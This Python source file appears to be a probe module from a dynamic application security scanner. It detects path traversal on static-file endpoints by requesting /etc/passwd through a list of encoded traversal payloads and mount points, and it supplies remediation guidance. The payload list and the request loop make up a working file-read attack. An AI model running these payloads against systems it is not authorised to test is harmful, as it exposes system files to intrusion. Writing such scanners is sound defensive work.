#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Path traversal at static-file / asset-serve endpoints.

`app.use("/files", express.static(uploadsDir))` and its peers in
every other framework are recurring sources of LFI: the file-serve
helper joins user-supplied path segments with the root directory,
and a `..%2f..%2fetc%2fpasswd` request escapes the root if the
helper hasn't been hardened.

Reading `/etc/passwd` is the classic detection signal because
nothing else returns the literal byte sequence `root:x:0:0:`. Even
better, the marker is dataless -- we don't need to upload anything,
we don't need to authenticate, and the response either contains
the marker or it doesn't.

Detection signal:
  GET each of `/<location>/<encoded-traversal>/etc/passwd` for a
  small list of `<location>` prefixes (`/static`, `/uploads`,
  `/files`, `/assets`, `/api/files`) and a small list of encoded
  traversal payloads (`../../../`, `..%2f..%2f..%2f`, `%2e%2e/%2e%2e/`,
  `....//....//`, `..%252f..%252f` for double-encoded).
  Validate when any response body matches `^root:x:0:0:` (multiline)
  OR contains the Windows hosts-file marker `[fonts]` near
  `[boot loader]`.

Tested against:
  + OWASP Juice Shop  /assets/, /api/v1, etc. don't honour traversal
                      -> validated=False.
  + Apps with un-hardened `express.static` / Apache Alias -> validated=True.

Read-only: GET only. The /etc/passwd marker is universally safe to
read on any Linux host -- no destructive side effects.
"""
from __future__ import annotations

import re
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

# Mount points common in Express, Spring, Rails, ASP.NET, etc.
STATIC_LOCATIONS = (
    "/static",
    "/assets",
    "/uploads",
    "/files",
    "/public",
    "/api/files",
    "/api/v1/files",
    "/cdn",
    "/img",
    "/images",
    "/download",
)

# Traversal patterns to try. Order matters -- start with the
# most-effective on Express (`%2e%2e%2f` triple-decoded), end with
# the high-noise variants. Each pattern is appended to the location
# verbatim and the target file `etc/passwd` is appended at the end
# without a leading slash.
TRAVERSAL_PAYLOADS = (
    "/../../../etc/passwd",
    "/..%2f..%2f..%2fetc%2fpasswd",
    "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "/....//....//....//etc/passwd",
    "/..%252f..%252f..%252fetc%252fpasswd",     # double-encoded
)

# Body-content markers that prove we read /etc/passwd. The first
# regex matches the most reliable line (root:x:0:0). The second
# covers Windows hosts file as a backup.
_PASSWD_RE = re.compile(r"^root:x:0:0:", re.MULTILINE)
_HOSTS_RE  = re.compile(r"\[boot loader\].*\[fonts\]", re.DOTALL)


class PathTraversalStaticServeProbe(Probe):
    name = "path_traversal_static_serve"
    summary = ("Detects path traversal at static-file / asset-serve "
               "endpoints by reading /etc/passwd via a fixed catalogue "
               "of mount-point and encoding combinations.")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--location", action="append", default=[],
            help="Additional static-file mount point (e.g. '/cdn'). "
                 "Repeatable.")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        locations = list(STATIC_LOCATIONS) + list(args.location or [])

        attempts: list[dict] = []
        confirmed: dict | None = None
        for loc in locations:
            for pl in TRAVERSAL_PAYLOADS:
                url = urljoin(origin, loc) + pl
                r = client.request("GET", url)
                row: dict = {"location": loc, "payload": pl,
                             "status": r.status, "size": r.size}
                if r.status == 200 and r.body:
                    text = r.text or ""
                    if _PASSWD_RE.search(text):
                        row.update({"marker": "etc/passwd (root:x:0:0:)",
                                    "snippet": text[:200]})
                        confirmed = row
                        attempts.append(row)
                        break
                    if _HOSTS_RE.search(text):
                        row.update({"marker": "windows hosts",
                                    "snippet": text[:200]})
                        confirmed = row
                        attempts.append(row)
                        break
                attempts.append(row)
            if confirmed:
                break

        evidence = {"origin": origin, "attempts": attempts}
        if confirmed:
            return Verdict(
                validated=True, confidence=0.97,
                summary=(
                    f"Confirmed: path traversal at "
                    f"{origin}{confirmed['location']} -- the payload "
                    f"{confirmed['payload']!r} returned a system file "
                    f"({confirmed['marker']}). The static-file handler "
                    "joins user-supplied path segments with its root "
                    "directory without normalising or refusing "
                    "traversal sequences."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="critical",
                remediation=(
                    "Resolve the requested path inside the root "
                    "directory and refuse anything that escapes:\n"
                    "  - Express: replace `express.static` with "
                    "`serve-static` only after asserting "
                    "`path.resolve(root, requested)` starts with "
                    "`path.resolve(root)` plus `path.sep`.\n"
                    "  - Apache: enable `Options -Indexes` AND "
                    "`<DirectoryMatch \"\\.\\.\">` Deny rules.\n"
                    "  - nginx: prefer `root` over `alias` (avoids the "
                    "off-by-slash class entirely); see the dedicated "
                    "nginx-alias probe for that variant.\n"
                    "  - Java Spring: drop the `..` segment server-side "
                    "via `Paths.get(...).normalize()` and verify the "
                    "resolved path is still under the configured root.\n"
                    "Audit access logs during the exposure window for "
                    "patterns matching `..%2f` / `%2e%2e` / `....//` -- "
                    "these are the hallmark request shapes."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: tested {len(attempts)} location/payload "
                     f"combinations on {origin}; none returned the "
                     "/etc/passwd marker."),
            evidence=evidence,
        )


if __name__ == "__main__":
    PathTraversalStaticServeProbe().main()
